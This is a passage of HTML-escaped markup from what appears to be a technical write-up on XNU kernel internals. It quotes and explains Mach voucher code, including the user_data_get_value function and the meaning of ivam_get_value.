 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_flag&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;new_value_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_release&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivam-&amp;gt;ivam_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is calling the attribute type&amp;#39;s function pointer which defines the meaning for the particular type of &amp;quot;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;get_value&lt;/span&gt;&lt;span&gt;&amp;quot;. The term &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;here is a little confusing; aren&amp;#39;t we trying to store a new value? (and there&amp;#39;s no subsequent call to a method like &amp;quot;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;store_value&lt;/span&gt;&lt;span&gt;&amp;quot;.) A better way to think about the semantics of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is that it&amp;#39;s meant to evaluate both &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;previous_vals&lt;/span&gt;&lt;span&gt;&amp;nbsp;(either the value from &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;previous_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;or the value currently in this voucher) and &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;content&lt;/span&gt;&lt;span&gt;&amp;nbsp;(the arbitrary byte buffer from this sub-recipe) and combine/evaluate them to &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c14&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;a value representation. It&amp;#39;s then up to the controller layer to store/cache that value. (Actually there&amp;#39;s one tedious snag in this system which we&amp;#39;ll get to involving locking...)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivam_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;for the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;attribute type is &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_get_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.65736db9786b611699f698b6e62ebfcd88a48199&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.27&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp;kern_return_t&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;user_data_get_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_manager_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;__assert_only manager&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __assert_only key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_command_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_array_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;prev_values&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_array_size_t &amp;nbsp; &amp;nbsp; prev_value_count&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;out_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_flags_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;out_flags&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;out_value_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_element_t elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;user_data_manager &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;manager&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; USER_DATA_ASSERT_KEY&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* never an out voucher */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;out_value_voucher &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;IPC_VOUCHER_NULL&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;out_flags &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_VALUE_FLAGS_NONE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* redeem of previous values is the value */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;prev_value_count&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;user_data_element_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;prev_values&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;++;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;out_value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;prev_values&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* redeem of default is default */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;out_value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
